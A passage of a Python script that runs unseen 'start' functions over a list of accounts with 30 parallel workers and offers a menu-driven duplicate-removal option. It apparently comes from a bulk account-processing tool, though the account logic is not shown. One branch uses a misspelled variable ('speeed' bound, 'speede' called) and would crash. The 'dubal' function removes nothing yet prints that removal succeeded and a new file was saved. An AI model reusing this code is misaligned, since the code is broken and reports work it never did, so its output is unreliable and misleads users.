    	accounts.append(x)
    
    if m=='2':
        with speed(max_workers=30) as speeed:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()
def dubal():
    os.system('clear')
    print(logo)
    print(" Enter File Path / File Location \n")
    elite = input(' Put File Name :')
    print(" ")
    
    os.system('clear')
    print(logo)
    print(" Removed Successful From File: " + elite )
    print(" New File Saved:" + elite )
    print(47*'-')
Main()